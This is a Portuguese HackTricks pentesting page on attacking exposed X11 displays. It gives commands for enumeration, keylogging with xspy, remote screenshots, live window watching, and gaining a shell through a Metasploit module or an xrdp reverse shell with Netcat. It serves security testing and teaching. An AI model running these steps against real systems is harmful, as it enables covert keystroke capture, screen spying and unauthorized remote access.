# 6000 - Pentesting X11

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novos programas de recompensas por bugs

💬 Participe de discussões na comunidade

## Informações Básicas

O X Window System (também conhecido como X) é um sistema de janelas para exibições de bitmap, que é comum em sistemas operacionais baseados em UNIX. O X fornece o quadro básico para um ambiente baseado em GUI. O X também não exige a interface do usuário - programas individuais lidam com isso.\
De: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**Porta padrão:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Enumeração

Verifique a **conexão anônima:**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### Enumeração Local

O arquivo **`.Xauthority`** na pasta home do usuário é **usado** pelo **X11 para autorização**. De [**aqui**](https://stackoverflow.com/a/37367518):

> MIT-magic-cookie-1: Gerando 128 bits de chave ("cookie"), armazenando-o em \~/.Xauthority (ou onde a variável de ambiente XAUTHORITY aponta). O cliente o envia para o servidor em texto simples! O servidor verifica se tem uma cópia deste "cookie" e, se tiver, a conexão é permitida. A chave é gerada pelo DMX.

{% hint style="warning" %}
Para **usar o cookie**, você deve definir a variável de ambiente: **`export XAUTHORITY=/caminho/para/.Xauthority`**
{% endhint %}

## Verificar Conexão
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keyloggin

[xspy](http://tools.kali.org/sniffingspoofing/xspy) para capturar as teclas digitadas no teclado.

Exemplo de saída:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Captura de tela

Para capturar a tela de um sistema X11 remoto, podemos usar o comando `xwd` para capturar a imagem e, em seguida, usar o comando `xwud` para exibir a imagem capturada. Também podemos usar o comando `xwd` em conjunto com o comando `convert` do ImageMagick para converter a imagem capturada em um formato mais comum, como PNG ou JPEG. É importante lembrar que a captura de tela pode ser detectada pelo usuário do sistema remoto, portanto, é recomendável usar essa técnica com cautela e apenas em situações em que é legal e ético fazê-lo.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Visualização de Área de Trabalho Remota

Fonte: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Primeiro, precisamos encontrar o ID da janela usando o xwininfo.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Para **visualização ao vivo** precisamos usar
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Obter Shell
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Outra maneira:

**Shell Reverso:** Xrdp também permite obter um shell reverso via Netcat. Digite o seguinte comando:

**./xrdp.py \<IP:0> –no-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

Será exibido um novo painel de controle onde podemos ver a opção R-shell, ilustrada abaixo:

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

Iniciaremos o modo de escuta do Netcat em nosso sistema local na porta 5555, ilustrado abaixo:

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

Em seguida, adicione o IP e a porta e selecione R-Shell, ilustrado abaixo:

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

Agora, como pode ser visto abaixo, temos acesso completo ao sistema:

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

\`\`

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novos programas de recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
